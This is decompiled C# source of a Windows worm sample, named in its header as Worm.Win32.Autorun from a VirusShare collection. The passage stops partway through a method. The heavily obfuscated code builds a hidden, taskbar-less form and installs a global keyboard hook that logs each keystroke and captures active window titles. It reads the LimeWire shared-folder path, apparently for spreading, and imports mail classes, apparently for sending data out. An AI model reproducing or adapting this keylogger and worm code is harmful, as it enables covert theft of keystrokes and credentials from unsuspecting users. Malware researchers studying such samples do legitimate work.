// Decompiled with JetBrains decompiler
// Type: Server.Form1
// Assembly: Server, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: 84A0DB64-644B-4D8C-8E08-B82602C6312E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Worm.Win32.Autorun.ibt-c1a94aec04a821d4676199630be81b3f13d2cb4319e28788a5ee0ff8ee699ca7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Server.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Xenocode.Postbuild.Inject.StringEncrypt;

namespace Server
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    [AccessedThroughProperty("Timer6")]
    private System.Windows.Forms.Timer _Timer6;
    [AccessedThroughProperty("textbox5")]
    private TextBox _textbox5;
    [AccessedThroughProperty("TextBox6")]
    private TextBox _TextBox6;
    [AccessedThroughProperty("TextBox7")]
    private TextBox _TextBox7;
    [AccessedThroughProperty("Timer7")]
    private System.Windows.Forms.Timer _Timer7;
    [AccessedThroughProperty("Timer8")]
    private System.Windows.Forms.Timer _Timer8;
    [AccessedThroughProperty("Timer5")]
    private System.Windows.Forms.Timer _Timer5;
    private string nl;
    private string[] options;
    private string nie9zcYPUv;
    private string zNYN2apmvZ;
    private string CMoPfL3l2I;
    private string b4d8hOGWIz;
    private string n01ypBQrhK;
    private string fazEqHLo8Y;
    private string BIYaksaUXR;
    private string TXPYU9ol9I;
    private string Jje3WLD2TX;
    private string RK8mvhFc0D;
    private string u1ISb2tL71;
    private string xUXee9fLsc;
    private string Hoce22GrYR;
    private string FLs3dYBgcK;
    private string HReXgzZX4q;
    private const string N21juq02jEGNmaq0wedearsjiqawdEXASi2 = "@Ghxp44YKYC@";
    [AccessedThroughProperty("kbHook")]
    private Form1.KeyboardHook _kbHook;
    private string strin;
    private string LimePfad;
    public const string SE_DEBUG_NAME = "SeDebugPrivilege";
    public const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
    public const string SE_SECURITY_NAME = "SeSecurityPrivileges";
    public const string SE_TCB_NAME = "SeTcbPrivileges";
    public const string SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivileges";
    private const int TOKEN_ADJUST_PRIVILEGES = 32;
    private const int TOKEN_QUERY = 8;
    private const int SE_PRIVILEGE_ENABLED = 2;
    private const int ANYSIZE_ARRAY = 1;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
label_11:
      this.Load += new EventHandler(this.Form1_Load);
      List<WeakReference> encList = Form1.__ENCList;
label_8:
      if (true)
        goto label_9;
label_1:
      this.strin = (string) null;
      this.LimePfad = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object) 0));
      this.InitializeComponent();
      if (true)
        return;
      if (false)
        goto label_8;
label_3:
      this.nl = Environment.NewLine;
      this.kbHook = new Form1.KeyboardHook();
      if (false)
        return;
      goto label_1;
label_9:
      if (true)
      {
        Monitor.Enter((object) encList);
        try
        {
          Form1.__ENCList.Add(new WeakReference((object) this));
          goto label_3;
        }
        finally
        {
          Monitor.Exit((object) encList);
        }
      }
      else
        goto label_11;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          goto label_13;
label_9:
        int num;
        if (this.components != null)
          num = 1;
        else
          goto label_13;
label_11:
        bool flag = num != 0;
label_7:
        if (false)
          goto label_8;
label_2:
        if (!flag)
        {
          if (true)
            return;
          if (true)
            goto label_7;
        }
        else
          goto label_6;
label_5:
        if ((uint) flag + (uint) disposing >= 0U || (uint) disposing > uint.MaxValue)
          return;
        goto label_2;
label_6:
        this.components.Dispose();
        if (false)
          goto label_5;
        else
          goto label_5;
label_8:
        if (false)
          goto label_9;
        else
          goto label_6;
label_13:
        num = 0;
        goto label_11;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
label_65:
      do
      {
        this.TextBox2 = new TextBox();
        this.TextBox3 = new TextBox();
        this.TextBox4 = new TextBox();
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.Timer2 = new System.Windows.Forms.Timer(this.components);
      }
      while (false);
      if (true)
        goto label_63;
      else
        goto label_59;
label_46:
      TextBox textBox3_1 = this.TextBox3;
      Size size1 = new Size(100, 20);
      Size size2 = size1;
      textBox3_1.Size = size2;
label_47:
      this.TextBox3.TabIndex = 2;
      TextBox textBox4_1 = this.TextBox4;
      Point point1 = new Point(338, 64);
      Point point2 = point1;
      textBox4_1.Location = point2;
      if (false)
        goto label_14;
      else
        goto label_48;
label_6:
      while (true)
      {
        if (true)
          goto label_3;
label_1:
        if (true)
        {
          this.ResumeLayout(false);
          this.PerformLayout();
          if (true)
            return;
          continue;
        }
        goto label_57;
label_3:
        if (true)
        {
          this.WindowState = FormWindowState.Minimized;
          if (true)
          {
            if (true)
              goto label_1;
          }
          else
            goto label_15;
        }
        else
          goto label_58;
      }
      goto label_63;
label_10:
      while (true)
      {
        this.StartPosition = FormStartPosition.CenterScreen;
        this.TransparencyKey = System.Drawing.Color.White;
        if (true)
        {
          if (false)
          {
            if (true)
              goto label_27;
          }
          else
            goto label_6;
        }
        else
          goto label_61;
      }
      goto label_55;
label_14:
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      if (true)
      {
        if (true)
        {
          this.ShowInTaskbar = false;
          goto label_10;
        }
        else
          goto label_6;
      }
      else
        goto label_34;
label_15:
      this.MinimizeBox = false;
      if (true)
        goto label_14;
      else
        goto label_10;
label_18:
      if (true)
      {
        this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        if (true)
        {
          this.MaximizeBox = false;
          goto label_15;
        }
      }
      else
        goto label_35;
label_27:
      if (false)
        goto label_40;
label_28:
      this.Controls.Add((Control) this.textbox5);
      do
      {
        this.Controls.Add((Control) this.TextBox4);
        this.Controls.Add((Control) this.TextBox3);
        if (true)
        {
          if (true)
            goto label_24;
label_20:
          if (true)
          {
            if (true)
            {
              if (true)
                continue;
              goto label_60;
            }
            else
              goto label_49;
          }
          else
            goto label_36;
label_24:
          this.Controls.Add((Control) this.TextBox2);
          goto label_20;
        }
        else
          goto label_14;
      }
      while (false);
      this.Controls.Add((Control) this.TextBox1);
      goto label_18;
label_34:
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      if (true)
      {
        this.AutoScaleMode = AutoScaleMode.Font;
        if (true)
        {
          do
          {
            this.BackColor = System.Drawing.Color.White;
            if (true)
            {
              if (true)
              {
                do
                {
                  size1 = new Size(730, 234);
                  this.ClientSize = size1;
                  this.ControlBox = false;
                  this.Controls.Add((Control) this.TextBox7);
                  this.Controls.Add((Control) this.TextBox6);
                }
                while (false);
              }
              else
                break;
            }
            else
              goto label_56;
          }
          while (false);
          goto label_27;
        }
        else
          goto label_27;
      }
      else
        goto label_37;
label_35:
      TextBox textBox7_1 = this.TextBox7;
      size1 = new Size(100, 20);
      Size size3 = size1;
      textBox7_1.Size = size3;
label_36:
      this.TextBox7.TabIndex = 6;
      goto label_34;
label_37:
      this.TextBox6.TabIndex = 5;
      TextBox textBox7_2 = this.TextBox7;
      point1 = new Point(338, 202);
      Point point3 = point1;
      textBox7_2.Location = point3;
      this.TextBox7.Name = "TextBox7";
      goto label_35;
label_40:
      this.textbox5.Name = "textbox5";
      TextBox textbox5_1 = this.textbox5;
      size1 = new Size(219, 72);
      Size size4 = size1;
      textbox5_1.Size = size4;
      this.textbox5.TabIndex = 4;
      TextBox textBox6_1 = this.TextBox6;
      point1 = new Point(326, 90);
      Point point4 = point1;
      textBox6_1.Location = point4;
      if (true)
      {
        if (true)
        {
          this.TextBox6.Multiline = true;
          this.TextBox6.Name = "TextBox6";
          if (true)
          {
            TextBox textBox6_2 = this.TextBox6;
            size1 = new Size(202, 107);
            Size size5 = size1;
            textBox6_2.Size = size5;
            goto label_37;
          }
          else
            goto label_18;
        }
        else
          goto label_59;
      }
      else
        goto label_53;
label_48:
      if (true)
      {
        this.TextBox4.Name = "TextBox4";
        if (true)
        {
          if (true)
          {
            if (true)
            {
              TextBox textBox4_2 = this.TextBox4;
              size1 = new Size(100, 20);
              Size size6 = size1;
              textBox4_2.Size = size6;
              if (true)
              {
                if (true)
                {
                  this.TextBox4.TabIndex = 3;
                  TextBox textbox5_2 = this.textbox5;
                  point1 = new Point(444, 12);
                  Point point5 = point1;
                  textbox5_2.Location = point5;
                  this.textbox5.Multiline = true;
                  goto label_40;
                }
                else
                  goto label_53;
              }
              else
                goto label_50;
            }
            else
              goto label_28;
          }
          else
            goto label_46;
        }
      }
label_49:
      this.TextBox2.TabIndex = 1;
      TextBox textBox3_2 = this.TextBox3;
      point1 = new Point(338, 38);
      Point point6 = point1;
      textBox3_2.Location = point6;
      this.TextBox3.Name = "TextBox3";
      goto label_46;
label_50:
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(338, 12);
      Point point7 = point1;
      textBox2_1.Location = point7;
      this.TextBox2.Name = "TextBox2";
label_51:
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(100, 20);
      Size size7 = size1;
      textBox2_2.Size = size7;
      goto label_49;
label_53:
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_1 = this.TextBox1;
      size1 = new Size(308, 197);
      Size size8 = size1;
      textBox1_1.Size = size8;
      this.TextBox1.TabIndex = 0;
      if (false)
        goto label_47;
      else
        goto label_50;
label_55:
      TextBox textBox1_2 = this.TextBox1;
      point1 = new Point(12, 12);
      Point point8 = point1;
      textBox1_2.Location = point8;
label_56:
      this.TextBox1.Multiline = true;
      goto label_53;
label_57:
      if (false)
        goto label_56;
label_58:
      this.SuspendLayout();
      goto label_55;
label_59:
      if (false)
        goto label_65;
label_60:
      this.Timer8 = new System.Windows.Forms.Timer(this.components);
      this.Timer5 = new System.Windows.Forms.Timer(this.components);
      goto label_57;
label_61:
      this.TextBox7 = new TextBox();
      this.Timer7 = new System.Windows.Forms.Timer(this.components);
      if (true)
        goto label_59;
label_63:
      do
      {
        this.Timer3 = new System.Windows.Forms.Timer(this.components);
        this.Timer4 = new System.Windows.Forms.Timer(this.components);
        this.Timer6 = new System.Windows.Forms.Timer(this.components);
        if (true)
        {
          this.textbox5 = new TextBox();
          this.TextBox6 = new TextBox();
        }
        else
          goto label_51;
      }
      while (false);
      if (true)
        goto label_61;
      else
        goto label_59;
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual TextBox TextBox4
    {
      [DebuggerNonUserCode] get => this._TextBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        do
        {
          bool flag = this._Timer1 != null;
          if ((uint) flag < 0U || flag)
            goto label_15;
          else
            goto label_13;
label_11:
          this._Timer1 = value;
          if (true)
          {
label_7:
            do
            {
              if ((uint) flag - (uint) flag <= uint.MaxValue)
                goto label_8;
label_2:
              this._Timer1.Tick += eventHandler;
              if ((uint) flag - (uint) flag > uint.MaxValue || (uint) flag + (uint) flag <= uint.MaxValue)
                goto label_12;
label_3:
              continue;
label_8:
              flag = this._Timer1 != null;
              while (false)
              {
                if (((flag ? 1 : 0) & 0) == 0)
                {
                  if ((uint) flag + (uint) flag >= 0U)
                  {
                    if (true)
                      goto label_2;
                    else
                      goto label_10;
                  }
                  else
                    goto label_7;
                }
              }
              if (flag)
                goto label_2;
              else
                goto label_3;
            }
            while (((flag ? 1 : 0) & 0) != 0);
label_10:
            continue;
          }
          goto label_16;
label_13:
          if (true || (uint) flag > uint.MaxValue)
            goto label_11;
          else
            continue;
label_15:
          this._Timer1.Tick -= eventHandler;
          goto label_11;
        }
        while (false);
        goto label_17;
label_12:
        return;
label_17:
        return;
label_16:;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
label_7:
        bool flag;
        if (((flag ? 1 : 0) & 0) != 0)
          goto label_5;
        else
          goto label_8;
label_4:
        this._Timer2 = value;
label_5:
        flag = this._Timer2 != null;
        if ((uint) flag - (uint) flag >= 0U)
        {
          if (!flag)
            return;
          if (true)
          {
            this._Timer2.Tick += eventHandler;
            if ((uint) flag <= uint.MaxValue)
              return;
            goto label_4;
          }
        }
        else
          goto label_7;
label_8:
        if (this._Timer2 != null)
        {
          this._Timer2.Tick -= eventHandler;
          goto label_4;
        }
        else
          goto label_4;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        bool flag1;
        do
        {
          bool flag2 = this._Timer3 != null;
          if ((uint) flag2 >= 0U)
          {
            if (true)
            {
              if (flag2)
                goto label_11;
            }
            else
              goto label_14;
label_9:
            do
            {
              this._Timer3 = value;
              flag1 = this._Timer3 != null;
              if (true)
              {
                while (!flag1)
                {
                  if ((uint) flag1 <= uint.MaxValue)
                  {
                    if (true)
                      goto label_15;
                  }
                  else
                    goto label_9;
                }
                this._Timer3.Tick += eventHandler;
              }
              else
                goto label_15;
            }
            while ((uint) flag1 + (uint) flag1 < 0U);
            goto label_5;
label_11:
            this._Timer3.Tick -= eventHandler;
            goto label_9;
label_14:
            if ((uint) flag2 - (uint) flag2 >= 0U)
              goto label_11;
label_15:;
          }
          else
            goto label_10;
        }
        while (false);
        goto label_12;
label_5:
        if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
          ;
        return;
label_12:
        return;
label_10:;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
        bool flag;
        while (((flag ? 1 : 0) | -1) != 0)
        {
          flag = this._Timer4 != null;
label_12:
          if (!flag)
            goto label_8;
          else
            goto label_9;
label_7:
label_8:
          do
          {
            this._Timer4 = value;
            flag = this._Timer4 != null;
            if (((flag ? 1 : 0) & 0) != 0)
              goto label_3;
            else
              goto label_6;
label_2:
            if (flag)
              this._Timer4.Tick += eventHandler;
            else
              goto label_4;
label_3:
            if (true)
              continue;
label_4:
            if (true)
              goto label_15;
            else
              goto label_2;
label_6:
            if ((uint) flag - (uint) flag <= uint.MaxValue)
            {
              if (((flag ? 1 : 0) | -2) != 0)
                goto label_2;
              else
                goto label_12;
            }
            else
              goto label_7;
          }
          while (false);
          break;
label_15:
          if ((uint) flag >= 0U)
            break;
          continue;
label_9:
          this._Timer4.Tick -= eventHandler;
          goto label_7;
        }
      }
    }

    internal virtual System.Windows.Forms.Timer Timer6
    {
      [DebuggerNonUserCode] get => this._Timer6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer6_Tick);
        bool flag = this._Timer6 != null;
        if (true)
          goto label_7;
label_1:
        while (!flag)
        {
          if (true)
            return;
        }
        this._Timer6.Tick += eventHandler;
        if (true)
        {
          if ((uint) flag > uint.MaxValue || true)
            return;
          goto label_6;
        }
label_5:
        this._Timer6 = value;
label_6:
        flag = this._Timer6 != null;
        goto label_1;
label_7:
        if (flag)
        {
          this._Timer6.Tick -= eventHandler;
          if ((uint) flag + (uint) flag <= uint.MaxValue)
            goto label_5;
          else
            goto label_1;
        }
        else
          goto label_5;
      }
    }

    internal virtual TextBox textbox5
    {
      [DebuggerNonUserCode] get => this._textbox5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._textbox5 = value;
    }

    internal virtual TextBox TextBox6
    {
      [DebuggerNonUserCode] get => this._TextBox6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox6 = value;
    }

    internal virtual TextBox TextBox7
    {
      [DebuggerNonUserCode] get => this._TextBox7;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox7 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer7
    {
      [DebuggerNonUserCode] get => this._Timer7;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer7_Tick);
        bool flag = this._Timer7 != null;
label_4:
        do
        {
          if (flag)
            goto label_8;
label_2:
          this._Timer7 = value;
          flag = this._Timer7 != null;
          if (flag)
            continue;
          goto label_7;
label_8:
          this._Timer7.Tick -= eventHandler;
          do
          {
            if ((uint) flag - (uint) flag < 0U)
              goto label_4;
          }
          while (((flag ? 1 : 0) | int.MaxValue) == 0);
          goto label_2;
        }
        while ((uint) flag - (uint) flag < 0U);
        this._Timer7.Tick += eventHandler;
        return;
label_7:;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer8
    {
      [DebuggerNonUserCode] get => this._Timer8;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer8_Tick);
        bool flag = this._Timer8 != null;
label_9:
        if (!flag)
          goto label_6;
        else
          goto label_10;
label_3:
        do
        {
          if (flag)
            goto label_4;
label_1:
          if (true)
            goto label_11;
label_4:
          this._Timer8.Tick += eventHandler;
          if ((uint) flag - (uint) flag >= 0U)
          {
            if (true)
            {
              if ((uint) flag + (uint) flag < 0U)
                goto label_1;
            }
            else
              goto label_6;
          }
          else
            goto label_9;
        }
        while (false);
        goto label_8;
label_11:
        return;
label_8:
        return;
label_6:
        this._Timer8 = value;
        flag = this._Timer8 != null;
        goto label_3;
label_10:
        this._Timer8.Tick -= eventHandler;
        if ((uint) flag - (uint) flag > uint.MaxValue || true)
          goto label_6;
        else
          goto label_3;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer5
    {
      [DebuggerNonUserCode] get => this._Timer5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Timer5 = value;
    }

    private virtual Form1.KeyboardHook kbHook
    {
      [DebuggerNonUserCode] get => this._kbHook;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Form1.KeyboardHook.c9YMqrTuOUEventHandler tuOuEventHandler = new Form1.KeyboardHook.c9YMqrTuOUEventHandler(this.shiftandcaps);
        bool flag = this._kbHook != null;
        if (flag)
          goto label_11;
        else
          goto label_7;
label_4:
        if (true)
          goto label_5;
label_1:
        if (flag)
        {
          Form1.KeyboardHook.c9YMqrTuOU += tuOuEventHandler;
          if (true)
            return;
        }
        if (true)
          return;
        goto label_11;
label_5:
        if ((uint) flag <= uint.MaxValue)
        {
          flag = this._kbHook != null;
          goto label_1;
        }
        else
          goto label_10;
label_7:
        do
        {
          this._kbHook = value;
        }
        while (false);
        if ((uint) flag >= 0U)
          goto label_4;
label_9:
        if (false)
          ;
label_10:
        if (true)
          goto label_7;
        else
          goto label_4;
label_11:
        Form1.KeyboardHook.c9YMqrTuOU -= tuOuEventHandler;
        goto label_9;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, string.Intern(x1110bdd110cdcea4._xaacba899487bce8c("lpko", 7400187))) - 1));
    }

    public void shiftandcaps(Keys Key)
    {
      bool flag1 = !MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock;
label_2162:
      if (!flag1)
        goto label_1563;
      else
        goto label_2163;
label_4:
      bool flag2;
      if (true)
      {
        if ((uint) flag2 - (uint) flag1 >= 0U)
        {
          if ((uint) flag2 + (uint) flag1 >= 0U)
            return;
          goto label_353;
        }
      }
      else
        goto label_1433;
label_10:
      if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
      {
        if (((flag2 ? 1 : 0) | -2) == 0)
        {
          if (true)
            goto label_46;
          else
            goto label_26;
        }
        else
          goto label_82;
      }
      else
        goto label_321;
label_14:
      flag2 = Key == Keys.Multiply;
      if ((uint) flag1 + (uint) flag2 > uint.MaxValue)
        return;
      if (true)
      {
        if ((uint) flag2 > uint.MaxValue)
          goto label_29;
label_6:
        if (flag2)
        {
          this.TextBox1.Text += "*";
          if ((uint) flag1 - (uint) flag2 < 0U)
            goto label_4;
        }
        else
          goto label_4;
label_29:
        if (true)
        {
          if (true)
          {
            while ((uint) flag2 >= 0U)
            {
              if (((flag1 ? 1 : 0) | -2) != 0)
              {
                if ((uint) flag2 >= 0U)
                  goto label_4;
                else
                  goto label_10;
              }
            }
            goto label_6;
          }
          else if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
          {
            if ((uint) flag2 >= 0U)
              goto label_67;
            else
              goto label_62;
          }
          else
            goto label_82;
        }
        else
          goto label_46;
      }
      else
        goto label_827;
label_18:
      if (!flag2)
      {
        if (true)
        {
          if ((uint) flag2 >= 0U)
          {
            if (true)
            {
              if ((uint) flag1 - (uint) flag2 >= 0U)
                goto label_14;
              else
                goto label_28;
            }
            else
              goto label_25;
          }
          else
            goto label_868;
        }
        else
          goto label_496;
      }
      else
      {
        this.TextBox1.Text += "+";
        if (true)
          goto label_4;
      }
label_21:
      if (!flag2)
      {
        flag2 = Key == Keys.Add;
        goto label_18;
      }
      else
      {
        this.TextBox1.Text += "-";
        goto label_4;
      }
label_25:
      flag2 = Key == Keys.Subtract;
      goto label_21;
label_26:
      if (!flag2)
        goto label_25;
label_28:
      this.TextBox1.Text += ".";
      goto label_4;
label_41:
      while (!flag2)
      {
        if ((uint) flag2 >= 0U)
        {
          if (((flag2 ? 1 : 0) & 0) == 0)
          {
            if (((flag2 ? 1 : 0) | -2) != 0)
            {
              if ((uint) flag1 >= 0U)
                goto label_34;
              else
                goto label_39;
label_33:
              this.TextBox1.Text += "/";
              goto label_4;
label_34:
              flag2 = Key == Keys.Divide;
              if (((flag2 ? 1 : 0) & 0) != 0)
                return;
              if (!flag2)
              {
                if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
                {
                  flag2 = Key == Keys.Decimal;
                  if ((uint) flag2 >= 0U)
                    goto label_45;
                  else
                    continue;
                }
                else
                  goto label_576;
              }
              else
                goto label_33;
label_39:
              if ((uint) flag1 > uint.MaxValue)
              {
                if ((uint) flag2 >= 0U)
                  continue;
                continue;
              }
              if ((uint) flag1 - (uint) flag1 >= 0U)
                goto label_33;
label_45:
              if ((uint) flag2 <= uint.MaxValue)
                goto label_26;
              else
                goto label_46;
            }
            else
              goto label_967;
          }
          else
            goto label_424;
        }
        else
          goto label_1530;
      }
label_42:
      this.TextBox1.Text += "<ESC>";
label_43:
      if ((uint) flag2 - (uint) flag2 < 0U)
        goto label_2043;
      else
        goto label_4;
label_46:
      this.TextBox1.Text += "<END>";
      goto label_4;
label_52:
      if (flag2)
        goto label_56;
label_53:
      flag2 = Key == Keys.End;
      if (!flag2)
      {
        flag2 = Key == Keys.Escape;
        if (true)
        {
          if ((uint) flag1 <= uint.MaxValue)
            goto label_41;
          else
            goto label_26;
        }
        else
          goto label_577;
      }
      else if (true)
        goto label_46;
      else
        goto label_62;
label_56:
      this.TextBox1.Text += "<TAB>";
      if ((uint) flag1 + (uint) flag1 < 0U)
      {
        if ((uint) flag2 - (uint) flag1 >= 0U)
        {
          if (true)
            goto label_53;
          else
            goto label_52;
        }
      }
      else
        goto label_4;
label_60:
      this.TextBox1.Text += "?";
      goto label_4;
label_62:
      if (flag2)
      {
        this.TextBox1.Text += "?";
        goto label_4;
      }
label_63:
      flag2 = Key == Keys.Right;
      if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
      {
        if (!flag2)
        {
          flag2 = Key == Keys.Tab;
          if (((flag2 ? 1 : 0) | 1) == 0)
          {
            if ((uint) flag2 < 0U)
              return;
            goto label_56;
          }
          else
            goto label_52;
        }
        else
          goto label_60;
      }
      else
        goto label_52;
label_65:
      if (!flag2)
      {
        flag2 = Key == Keys.Left;
        goto label_62;
      }
label_67:
      this.TextBox1.Text += "?";
      goto label_4;
label_79:
      do
      {
        flag2 = Key == Keys.Back;
        if ((uint) flag2 <= uint.MaxValue)
        {
          if (!flag2)
          {
            flag2 = Key == Keys.Down;
            if (flag2)
            {
              if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
              {
                if ((uint) flag2 >= 0U)
                  goto label_81;
              }
              else
                goto label_70;
            }
            else
              goto label_69;
          }
          else
            goto label_75;
        }
        else
          goto label_80;
      }
      while (true);
      goto label_597;
label_69:
      flag2 = Key == Keys.Up;
      if (true)
      {
        if (((flag1 ? 1 : 0) | 8) == 0)
          goto label_880;
        else
          goto label_65;
      }
      else
        goto label_82;
label_70:
      this.TextBox1.Text += "?";
      if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
      {
        if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
        {
          if (false)
            goto label_4;
        }
        else
          goto label_81;
      }
      else
        goto label_4;
label_75:
      this.TextBox1.Text += "<DEL>";
      goto label_4;
label_80:
      if (true)
        goto label_75;
label_81:
      if ((uint) flag1 + (uint) flag2 > uint.MaxValue)
        return;
      goto label_4;
label_82:
      flag2 = Key == Keys.Delete;
      if (flag2)
      {
        this.TextBox1.Text += "<DEL>";
        goto label_81;
      }
      else
        goto label_79;
label_85:
      flag2 = Key == Keys.F12;
      if (flag2)
      {
        this.TextBox1.Text += "<F12>";
        if (((flag1 ? 1 : 0) & 0) == 0)
          goto label_4;
      }
      if ((uint) flag2 >= 0U)
        goto label_82;
      else
        goto label_321;
label_86:
      if (flag2)
      {
        this.TextBox1.Text += "<F11>";
        if (((flag2 ? 1 : 0) & 0) != 0)
          goto label_705;
        else
          goto label_4;
      }
      else
        goto label_85;
label_89:
      flag2 = Key == Keys.F11;
      goto label_86;
label_90:
      if (false)
        goto label_2059;
      else
        goto label_4;
label_97:
      this.TextBox1.Text += "<F9>";
      goto label_4;
label_98:
      flag2 = Key == Keys.F9;
      if (false)
        return;
label_96:
      while (!flag2)
      {
label_92:
        flag2 = Key == Keys.F10;
        if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
        {
          if ((uint) flag2 + (uint) flag2 >= 0U)
          {
            if (flag2)
            {
              this.TextBox1.Text += "<F10>";
              if (((flag1 ? 1 : 0) | -1) != 0)
                goto label_90;
              else
                goto label_86;
            }
            else
              goto label_89;
          }
          else
          {
            do
            {
              if (false)
                goto label_96;
            }
            while (((flag2 ? 1 : 0) & 0) != 0);
            goto label_92;
          }
        }
        else
          goto label_821;
      }
      goto label_97;
label_99:
      if (flag2)
      {
        this.TextBox1.Text += "<F8>";
        if ((uint) flag2 + (uint) flag1 < 0U)
          goto label_252;
        else
          goto label_4;
      }
      else
        goto label_98;
label_104:
      if (!flag2)
      {
        flag2 = Key == Keys.F8;
        goto label_99;
      }
label_110:
      this.TextBox1.Text += "<F7>";
      if (((flag1 ? 1 : 0) | 2) != 0)
      {
        if (((flag1 ? 1 : 0) & 0) == 0)
        {
          if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
          {
            if ((uint) flag1 > uint.MaxValue)
              return;
            if ((uint) flag1 - (uint) flag1 > uint.MaxValue)
              goto label_1392;
            else
              goto label_4;
          }
          else
            goto label_482;
        }
        else
          goto label_1627;
      }
      else
        goto label_1964;
label_113:
      if (!flag2)
      {
        flag2 = Key == Keys.F7;
        if (true)
          goto label_104;
        else
          goto label_110;
      }
      else
      {
        this.TextBox1.Text += "<F6>";
